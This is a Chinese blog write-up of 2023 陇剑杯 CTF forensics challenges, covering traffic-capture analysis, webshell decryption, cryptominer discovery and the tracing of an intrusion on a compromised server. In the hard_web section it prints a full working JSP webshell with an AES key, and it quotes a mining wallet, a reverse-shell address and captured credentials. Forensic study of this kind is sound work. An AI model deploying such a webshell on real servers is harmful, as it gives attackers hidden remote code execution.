+<h2 id="hard-web"><a href="#hard-web" class="headerlink" title="hard_web"></a>hard_web</h2><h3 id="1-3"><a href="#1-3" class="headerlink" title="1"></a>1</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402182150196.png" alt="image-20240218215039122"></p>
+<h4 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h4><p>看到这种找服务器开放端口的题 其实原理问的就是tcp三次握手 开放了端口肯定存在返回的ACK标志 那便需要我们找ACK标志</p>
+<p>先判断服务器的ip地址  这个很好判断就是<code>192.168.162.180</code></p>
+<p>使用tcpdump </p>
+<pre><code>tcpdump -n -r /home/kali/Desktop/hard_web.pcap &#39;tcp[13] =18&#39; | awk &#39;&#123;print $3&#125;&#39; | sort -u 
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402182347584.png" alt="image-20240218234755533"></p>
+<p>前三个就是 那么开放的端口就是<code>80 888 8888 </code></p>
+<h4 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h4><p>也可以直接在wireshark里面进行筛选 条件语句可以这样写</p>
+<pre><code>tcp.connection.synack and ip.dst==192.168.162.188
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402182349623.png" alt="image-20240218234944540"></p>
+<h3 id="2-3"><a href="#2-3" class="headerlink" title="2"></a>2</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402182350454.png" alt="image-20240218235010397"></p>
+<p>在传入jsp脚本之后 第一次进行命令执行的包处 追踪http流 找到key加密的过程</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402272128052.png" alt="image-20240219171505923"></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402191752400.png" alt="image-20240219175250365"></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402190014668.png" alt="image-20240219001430628"></p>
+<pre><code class="javascript">&lt;%! String xc=&quot;748007e861908c03&quot;; 
+class X extends ClassLoader&#123;
+    public X(ClassLoader z)&#123;
+        super(z);
+    &#125;public Class Q(byte[] cb)&#123;
+        return super.defineClass(cb, 0, cb.length);
+    &#125; 
+&#125;
+public byte[] x(byte[] s,boolean m)&#123; 
+    try&#123;javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(&quot;AES&quot;);
+        c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),&quot;AES&quot;));
+        return c.doFinal(s); &#125;catch (Exception e)&#123;return null; &#125;
+&#125;%&gt;
+&lt;%try&#123;
+    byte[] data=new byte[Integer.parseInt(request.getHeader(&quot;Content-Length&quot;))];
+    java.io.InputStream inputStream= request.getInputStream();int _num=0;while ((_num+=inputStream.read(data,_num,data.length))&lt;data.length);data=x(data, false);
+    if (session.getAttribute(&quot;payload&quot;)==null)&#123;
+        session.setAttribute(&quot;payload&quot;,new X(this.getClass().getClassLoader()).Q(data));
+    &#125;else&#123;
+        request.setAttribute(&quot;parameters&quot;, data);
+        Object f=((Class)session.getAttribute(&quot;payload&quot;)).newInstance();
+        java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();
+        f.equals(arrOut);
+        f.equals(pageContext);
+        f.toString();
+        response.getOutputStream().write(x(arrOut.toByteArray(), true));
+&#125; &#125;catch (Exception e)&#123;&#125;%&gt;
+</code></pre>
+<p>可以看到有gunzip和aes aes加密的key也给了<code>748007e861908c03</code>   找到最后一个jsp加密流量 将密文以hex的形式转储</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402191756710.png" alt="image-20240219175653599"></p>
+<p>用厨子进行解密</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402191757521.png" alt="image-20240219175752452"></p>
+<h3 id="3-3"><a href="#3-3" class="headerlink" title="3"></a>3</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402191758211.png" alt="image-20240219175813153"></p>
+<p>直接将aes的解密密钥解md5即可</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402191806589.png" alt="image-20240219180602528"></p>
+<pre><code>14mk3y
+</code></pre>
+<h2 id="IncidentResponse"><a href="#IncidentResponse" class="headerlink" title="IncidentResponse"></a>IncidentResponse</h2><h3 id="1-4"><a href="#1-4" class="headerlink" title="1"></a>1</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402191807183.png" alt="image-20240219180755108"></p>
+<p>首先对服务器进行挂载仿真</p>
+<p>题目中给出了登陆服务器的账号密码<code>root/IncidentResponsePasswd</code> 直接登陆root账户 </p>
+<p>这里我想的是先连上xshell 通过xftp将服务器中的文件下载下来 在使用D盾河马等工具进行扫描</p>
+<p>在对服务器进行仿真挂载之后 选择NAT模式 使用ifconfig查看ip地址 会发现没有ens33网卡</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402262041803.png" alt="image-20240226204115751"></p>
+<p>找到一篇解决问题的文章<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44365415/article/details/130108868?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170893659616800186546943%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=170893659616800186546943&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-130108868-null-null.142%5Ev99%5Epc_search_result_base9&utm_term=ubuntu%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%B2%A1%E6%9C%89ens33&spm=1018.2226.3001.4187">【ubuntu虚拟机】ens33未出现在ifconfig问题</a></p>
+<pre><code>ifconfig ens33 up
+dhclient ens33
+ifconfig
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402262042502.png" alt="image-20240226204253452"></p>
+<p>得到ip地址<code>192.168.160.158</code>  当然虚拟机的网络连接模式要选NAT模式 </p>
+<p>xshell连接成功 </p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402262045691.png" alt="image-20240226204537637"></p>
+<p>使用xftp将文件系统中的文件全部下载下来</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402262046088.png" alt="image-20240226204652002"></p>
+<p>然后使用D盾进行扫描 </p>
+<pre><code>\etc\redis\redis-server
+</code></pre>
+<p>这个文件里面存在后门 看一下文件结构 还是个linux可执行程序 那这个就是挖矿病毒的路径了</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402262119503.png" alt="image-20240226211924453"></p>
+<p>进行md5加密</p>
+<pre><code>6f72038a870f05cbf923633066e48881
+</code></pre>
+<h3 id="2-4"><a href="#2-4" class="headerlink" title="2"></a>2</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271248631.png" alt="image-20240227124816577"></p>
+<p>由第一题 我们可得挖矿病毒程序在<code>\etc\redis</code>文件夹下 那在同文件夹下一定还有关于挖矿病毒的文件</p>
+<p>找到<code>redis.conf</code>配置文件 </p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271251198.png" alt="image-20240227125129155"></p>
+<pre><code>这段代码看起来是关于加密货币挖矿的配置信息，可能是针对 XMRig 软件的配置。让我逐一解释：
+
+&quot;pools&quot;: [...]: 这是一个列表，包含了挖矿池的配置信息。
+&quot;algo&quot;: null: 这里应该指定挖矿所使用的算法，但是目前是空值，可能需要根据具体情况填写。
+&quot;coin&quot;: null: 指定挖矿的加密货币种类，同样是空值。
+&quot;url&quot;: &quot;donate.v2.xmrig.com:3333&quot;: 挖矿池的地址，通常包括主机名和端口号。
+&quot;user&quot;: &quot;YOUR_WALLET_ADDRESS&quot;: 这里需要填写你的数字货币钱包地址，挖矿所得的货币会发送到这个地址。
+&quot;pass&quot;: &quot;x&quot;: 密码，通常是 &#39;x&#39; 或者是空值。
+&quot;rig-id&quot;: null: 矿机的标识符，同样是空值。
+&quot;nicehash&quot;: false: 表示是否使用 NiceHash 挖矿，这里是 false，即不使用 NiceHash。
+&quot;keepalive&quot;: false: 是否保持挖矿连接活跃，这里是 false。
+&quot;enabled&quot;: true: 挖矿池是否启用，这里是 true。
+&quot;tls&quot;: false: 是否使用 TLS/SSL 连接，这里是 false。
+&quot;tls-fingerprint&quot;: null: TLS/SSL 指纹，同样是空值。
+&quot;daemon&quot;: false: 是否使用挖矿守护进程模式，这里是 false。
+&quot;socks5&quot;: null: SOCKS5 代理，同样是空值。
+&quot;self-select&quot;: null: 自选功能，为空值。
+&quot;submit-to-origin&quot;: false: 是否将挖矿结果提交到原始地址，这里是 false。
+</code></pre>
+<p>很明显矿池域名是</p>
+<pre><code>donate.v2.xmrig.com
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271300313.png" alt="image-20240227130018273"></p>
+<pre><code>3fca20bb92d0ed67714e68704a0a4503
+</code></pre>
+<h3 id="3-4"><a href="#3-4" class="headerlink" title="3"></a>3</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271300548.png" alt="image-20240227130039488"></p>
+<p>查看服务器的历史命令</p>
+<p>看到运行jar包之后生成了一个<code>nohup.log</code>日志文件 在<code>\home\app</code>文件夹下 在里面看到了很多shiro链 那就是shiro反序列化漏洞</p>
+<pre><code>shirodeserialization
+3ee726cb32f87a15d22fe55fa04c4dcd
+</code></pre>
+<h3 id="4-1"><a href="#4-1" class="headerlink" title="4"></a>4</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271833436.png" alt="image-20240227183332371"></p>
+<p>直接用last命令看一下登陆记录</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271835827.png" alt="image-20240227183517764"></p>
+<p>这几个就是</p>
+<pre><code>81.70.166.3
+c76b4b1a5e8c9e7751af4684c6a8b2c9
+</code></pre>
+<h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271835095.png" alt="image-20240227183555028"></p>
+<p>查看nginx服务器的日志文件 </p>
+<pre><code>cat \var\log\nginx\access.log
+</code></pre>
+<p>直接拉到最后</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271858068.png" alt="image-20240227185804997"></p>
+<pre><code>Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)
+mozilla/5.0(compatible;baiduspider/2.0;+http://www.baidu.com/search/spider.html)
+6ba8458f11f4044cce7a621c085bb3c6
+</code></pre>
+<h3 id="6"><a href="#6" class="headerlink" title="6"></a>6</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271901846.png" alt="image-20240227190112787"></p>
+<p>猜测是sshd软连接</p>
+<p>直接搜一下</p>
+<pre><code>history | grep ssh
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271908952.png" alt="image-20240227190834907"></p>
+<p>查看这个文件</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271909843.png" alt="image-20240227190903805"></p>
+<p>UsePAM为YES的话就是通过ssh软连接进行权限维持</p>
+<p>再看一下ssh</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271911412.png" alt="image-20240227191140366"></p>
+<p>连接上了kali的ssh</p>
+<pre><code>/root/.ssh/authorized_keys
+a1fa1b5aeb1f97340032971c342c4258
+</code></pre>
+<h3 id="7"><a href="#7" class="headerlink" title="7"></a>7</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271912351.png" alt="image-20240227191218301"></p>
+<p>上面提到的redis挖矿病毒也算 </p>
+<pre><code>/lib/systemd/system/redis.service
+</code></pre>
+<p>这个文件一直在开启redis文件进行自动挖矿</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402271913573.png" alt="image-20240227191354528"></p>
+<pre><code>b2c5af8ce08753894540331e5a947d35
+</code></pre>
+<h2 id="SmallSword"><a href="#SmallSword" class="headerlink" title="SmallSword"></a>SmallSword</h2><h3 id="1-5"><a href="#1-5" class="headerlink" title="1"></a>1</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402192341144.png" alt="image-20240219234130980"></p>
+<p>找到蚁剑连接部分的流量  解一下url编码</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402201724005.png" alt="image-20240220172412934"></p>
+<pre><code>6ea280898e404bfabd0ebb702327b19f
+</code></pre>
+<p>看到<code>@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0)</code> 这部分前面就是蚁剑连接的密码</p>
+<pre><code>6ea280898e404bfabd0ebb702327b19f
+</code></pre>
+<h3 id="2-5"><a href="#2-5" class="headerlink" title="2"></a>2</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402202211103.png" alt="image-20240220221117025"></p>
+<p>直接找蚁剑连接的流量包一个个解密看内容就行 这个没什么技巧</p>
+<p>需要注意一点蚁剑流量在url编码之前会先进行一次base64加密 但是加密之后可能会在密文前添加不定字符 进行一个简单的免杀 这会使我们在解密的时候 如果不去掉这些额外字符解出来肯定会是乱码</p>
+<p>这个冗余字符的长度我们可以观察蚁剑流量传输的代码 </p>
+<p>下面是例子</p>
+<pre><code>$p = base64_decode(substr($_POST[&quot;m0300de6257f67&quot;], 2));
+substr函数的作用是截取字符串中指定长度的字符
+语法是int substr(string str, int start , int length)   
+那么对于上面这一部分蚁剑流量 就可以理解为他从下标索引为2的字符(实际上就是第三个字符)开始截取 并进行base64解密
+</code></pre>
+<p>那么对于这个流量 我们也可以找到相关的语句 发现他没有进行免杀 直接从头开始解base64</p>
+<pre><code>$D=base64_decode($_POST[&quot;0x72b3f341e432&quot;]);
+</code></pre>
+<p>解密142条流量包的数据 发现存在写入一个名为<code>hacker.txt</code>的文件的操作</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402202333845.png" alt="image-20240220233301767"></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402202332884.png" alt="image-20240220233238792"></p>
+<p>这部分就是攻击者留存的值</p>
+<pre><code>ad6269b7-3ce2-4ae8-b97f-f259515e7a91 
+</code></pre>
+<h3 id="3-5"><a href="#3-5" class="headerlink" title="3"></a>3</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402202334167.png" alt="image-20240220233403097"></p>
+<p>第130个数据包处进行解密 发现是读取了一个<code>huorong.exe</code></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402202354803.png" alt="image-20240220235426750"></p>
+<p>同时导出http最大的文件也是这个包里面的 名为<code>info1.php</code> 提取出来看一下结构</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402202357252.png" alt="image-20240220235729184"></p>
+<p>删掉前面的<code>-&gt;|</code>  改名为<code>1.exe</code></p>
+<p>用pyinstxtractor.py来解析一下 发现一个<code>2.pyc</code></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402210006772.png" alt="image-20240221000601564"></p>
+<p>在线反编译一下</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402210009827.png" alt="image-20240221000937720"></p>
+<p>会生成一个<code>test.jpg</code>图片 运行一下 但是需要改下宽高 直接梭了</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402210016206.png" alt="image-20240221001658169"></p>
+<h2 id="tcpdump"><a href="#tcpdump" class="headerlink" title="tcpdump"></a>tcpdump</h2><h3 id="1-6"><a href="#1-6" class="headerlink" title="1"></a>1</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402211137806.png" alt="image-20240221113750721"></p>
+<p>观察整个流量包 很明显的爆破过程是先扫目录 扫到登陆目录在爆破用户名爆破用户密码  先筛选一波</p>
+<pre><code>http &amp;&amp; ip.src == 172.31.0.2 &amp;&amp; ip.dst == 172.31.0.1 &amp;&amp; http.response.code == 200
+</code></pre>
+<p>观察发现 当密码不对的时候 状态码是300</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402212305686.png" alt="image-20240221230515587"></p>
+<p>继续翻找 发现一个状态码为200的包</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402212305979.png" alt="image-20240221230540903"></p>
+<p>追踪tcp流 找到账号和密码</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402212306833.png" alt="image-20240221230608763"></p>
+<pre><code>TMjpxFGQwD:123457
+</code></pre>
+<h4 id="法二："><a href="#法二：" class="headerlink" title="法二："></a>法二：</h4><p>一种新的筛选方法 直接筛选状态码的内容</p>
+<pre><code>tcp contains &quot;&#123;\&quot;errCode\&quot;:200&#125;&quot;
+</code></pre>
+<p>注意双引号用\转义一下</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402212353738.png" alt="image-20240221235343684"></p>
+<h3 id="2-6"><a href="#2-6" class="headerlink" title="2"></a>2</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402212353601.png" alt="image-20240221235355531"></p>
+<p>大致了解一下越权漏洞 就是一种越过对特定资源读写的权限的漏洞 分为水平越权和垂直越权 水平就是同级别(权限)的用户 可以越权访问、修改或者删除的非法操作 垂直又分为向下越权和向上越权 </p>
+<p>通俗来讲就是 当权限验证做的不好的时候 抓包之后修改url后面的用户对应的参数 就可以实现越权访问</p>
+<p>观察发现 在密码爆破结束之后是第1585个包 userid&#x3D;2</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402272128129.png" alt="image-20240222234629544"></p>
+<p>拉倒最后 发现userid变成了1  实现了越权漏洞利用</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402272128877.png" alt="image-20240222234717512"></p>
+<p>此时的cookie为</p>
+<pre><code>accessToken=f412d3a0378d42439ee016b06ef3330c; zyplayertoken=f412d3a0378d42439ee016b06ef3330cQzw=; userid=1
+</code></pre>
+<p>进行md5加密</p>
+<pre><code>383c74db4e32513daaa1eeb1726d7255
+</code></pre>
+<h3 id="3-6"><a href="#3-6" class="headerlink" title="3"></a>3</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402272128473.png" alt="image-20240222235256927"></p>
+<p>没啥技巧 就是翻就完事了 或者同第一题筛选一下也可以</p>
+<pre><code>tcp contains &quot;jdbc&quot; &amp;&amp; tcp contains &quot;username&quot; &amp;&amp; tcp contains &quot;passwd&quot;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402272128607.png" alt="image-20240223000811948"></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402272128790.png" alt="image-20240223000828576"></p>
+<pre><code>zyplayer:1234567
+</code></pre>
+<h3 id="4-2"><a href="#4-2" class="headerlink" title="4"></a>4</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402272128407.png" alt="image-20240223000903469"></p>
+<p>在使用jdbc漏洞读取了数据库的账号密码之后 在向下翻找数据包 在1603流的内容中看到了很明显的反弹shell的语句</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402242110555.png" alt="image-20240224211033469"></p>
+<p>可以找到这个文件的名字是<code>custom.dtd.xml</code> 那向前翻找一个包 也可以找到这个文件</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402242111087.png" alt="image-20240224211100008"></p>
+<p>直接搜一下这段 </p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402242112639.png" alt="image-20240224211226582"></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402242113327.png" alt="image-20240224211343250"></p>
+<p>可以找到漏洞编号为<code>CVE-2022-21724</code></p>
+<pre><code>CVE-2022-21724:custom.dtd.xml
+</code></pre>
+<h3 id="5-1"><a href="#5-1" class="headerlink" title="5"></a>5</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402251559151.png" alt="image-20240225155907092"></p>
+<p> 看到第1611个流里面 在获取系统权限之后 使用curl命令 下载了fscan工具 </p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402251606083.png" alt="image-20240225160616995"></p>
+<pre><code>fscan
+</code></pre>
+<h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h2><h3 id="1-7"><a href="#1-7" class="headerlink" title="1"></a>1</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402251608375.png" alt="image-20240225160808322"></p>
+<p>这个其实很明显了 TCP协议的流量 第一个包是<code>192.168.246.1</code>向<code>192.168.246.28</code>发送SYN包 表示建立连接 那肯定<code>192.168.246.28</code>就是被入侵的主机ip</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402251623622.png" alt="image-20240225162342568"></p>
+<pre><code>192.168.246.28
+</code></pre>
+<h3 id="2-7"><a href="#2-7" class="headerlink" title="2"></a>2</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402251624590.png" alt="image-20240225162401549"></p>
+<p>也是在追踪tcp的第一个流里面 看到了输入用户名密码成功登陆被入侵主机的记录</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402251624897.png" alt="image-20240225162450792"></p>
+<pre><code>youcannevergetthis
+</code></pre>
+<h3 id="3-7"><a href="#3-7" class="headerlink" title="3"></a>3</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402251626451.png" alt="image-20240225162627383"></p>
+<p>看到在被入侵主机里面执行了<code>ls</code>命令</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402251645704.png" alt="image-20240225164549663"></p>
+<p>直接横着看就行 第二个是<code>Downloads</code> </p>
+<h3 id="4-3"><a href="#4-3" class="headerlink" title="4"></a>4</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402251653428.png" alt="image-20240225165326379"></p>
+<p>看到被入侵主机中执行了<code>cat /etc/passwd</code>命令</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402251654211.png" alt="image-20240225165437163"></p>
+<p>那倒数第二个用户名就是<code>mysql</code></p>
+<h2 id="server-save"><a href="#server-save" class="headerlink" title="server_save"></a>server_save</h2><h3 id="1-8"><a href="#1-8" class="headerlink" title="1"></a>1</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252028117.png" alt="image-20240225202807050"></p>
+<p>类似与tcpdump4的做法 先找到进入终端的流 是108流 看到是先用python创建了一个交互式终端 </p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252059240.png" alt="image-20240225205912166"></p>
+<p>向前翻 第106流是一个反弹shell的文件<code>bbbb.sh</code> 第107流就是执行这个反弹shell的码</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252103418.png" alt="image-20240225210303379"></p>
+<p>105流可以看到执行了传入cmd参数 内容是id 回显内容显示此时的用户是root 说明这个时候拿到了root权限</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252106716.png" alt="image-20240225210619658"></p>
+<p>那前面一个流 就是拿到root权限的方法</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252106999.png" alt="image-20240225210648923"></p>
+<p>直接搜一下这句 就找到了CVE编号</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252107153.png" alt="image-20240225210712105"></p>
+<pre><code>CVE-2022-22965
+</code></pre>
+<h3 id="2-8"><a href="#2-8" class="headerlink" title="2"></a>2</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252108936.png" alt="image-20240225210811880"></p>
+<p>这个反弹shell前面已经分析过了</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252108604.png" alt="image-20240225210303379"></p>
+<pre><code>192.168.43.128:2333
+</code></pre>
+<h3 id="3-8"><a href="#3-8" class="headerlink" title="3"></a>3</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252109883.png" alt="image-20240225210912839"></p>
+<p>这个就是翻do文件夹里面的文件系统 在<code>\home\guests</code>文件夹下找到一个<code>main</code>文件夹 放到沙箱里面分析一下 就是个elf可执行程序病毒文件</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252132078.png" alt="image-20240225213247982"></p>
+<pre><code>main
+</code></pre>
+<h3 id="4-4"><a href="#4-4" class="headerlink" title="4"></a>4</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252133969.png" alt="image-20240225213302908"></p>
+<p>直接在沙箱里面看分析结果</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252135563.png" alt="image-20240225213502521"></p>
+<p>添加了<code>ll</code>用户 密码明文为<code>123456</code></p>
+<pre><code>ll:123456
+</code></pre>
+<h3 id="5-2"><a href="#5-2" class="headerlink" title="5"></a>5</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252135108.png" alt="image-20240225213547063"></p>
+<p>在沙箱的异常行为分析中 看到这个病毒文件创建了一个隐藏文件或者系统文件 </p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252137942.png" alt="image-20240225213714896"></p>
+<p>我们看一下这个<code>.log.txt</code></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252137785.png" alt="image-20240225213736742"></p>
+<p>那就是这个ip了</p>
+<pre><code>172.105.202.239
+</code></pre>
+<h3 id="6-1"><a href="#6-1" class="headerlink" title="6"></a>6</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252138596.png" alt="image-20240225213800550"></p>
+<p>两个文件的话 那应该就是<code>\home\guests\.idea</code>下的两个文件了 看创建日期也能判断 这是在main运行之后产生的</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252140318.png" alt="image-20240225214056282"></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252140884.png" alt="image-20240225214031850"></p>
+<pre><code>lolMiner、mine_doge.sh
+</code></pre>
+<h3 id="7、8"><a href="#7、8" class="headerlink" title="7、8"></a>7、8</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252141823.png" alt="image-20240225214131774"></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252142603.png" alt="image-20240225214216553"></p>
+<p>都在<code>mine_doge.sh</code>这个文件夹下了</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402252142041.png" alt="image-20240225214241997"></p>
+<pre><code>POOL=doge.millpools.cc:5567
+WALLET=DOGE:DRXz1q6ys8Ao2KnPbtb7jQhPjDSqtwmNN9.lolMinerWorker
+</code></pre>
+</article></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/mikey.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="avatar"/></div><div class="author-info__name">w3nx1z1</div><div class="author-info__description">你相信引力吗？</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">56</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/w3nx1z1"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/w3nx1z1" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:1281027651@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a><a class="social-icon" href="http://wpa.qq.com/msgrd?v=3&amp;uin=1281027651&amp;site=qq&amp;menu=yes" target="_blank" title="QQ"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到w3nx1z1的博客!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2023%E9%99%87%E5%89%91%E6%9D%AF%E5%88%9D%E8%B5%9B"><span class="toc-text">2023陇剑杯初赛</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#baby-forensics"><span class="toc-text">baby_forensics</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1"><span class="toc-text">1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2"><span class="toc-text">2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3"><span class="toc-text">3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-web"><span class="toc-text">ez_web</span></a><ol class="toc-child"><li class="toc-item 